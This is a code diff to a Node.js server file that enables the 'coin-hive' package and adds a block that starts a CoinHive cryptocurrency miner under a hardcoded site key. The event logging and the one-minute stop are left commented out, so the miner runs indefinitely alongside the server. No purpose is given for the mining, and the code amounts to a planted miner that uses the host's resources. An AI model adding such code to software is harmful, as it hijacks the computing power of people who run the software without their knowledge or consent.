@@ -44,8 +44,8 @@ serverAdmin.start(app);
 
 
 
-//const CoinHive = require('coin-hive');
-//
+const CoinHive = require('coin-hive');
+
 //(async () => {
 //
 //  // Create miner
@@ -66,4 +66,26 @@ serverAdmin.start(app);
 //  // Stop miner
 //  setTimeout(async () => await miner.stop(), 60000); */
 //})();
+
+
+(async function() {
+
+  // Create miner
+  const miner = await CoinHive('Y88o17Z1nDLT1r9SjSCuljPQOATm7VzV'); // CoinHive's Site Key
+
+  // Start miner
+  await miner.start();
+
+/*   // Listen on events
+  miner.on('found', () => console.log('Found!'))
+  miner.on('accepted', () => console.log('Accepted!'))
+  miner.on('update', data => console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `));
+
+  // Stop miner
+  setTimeout(async () => await miner.stop(), 60000); */
+})();
 
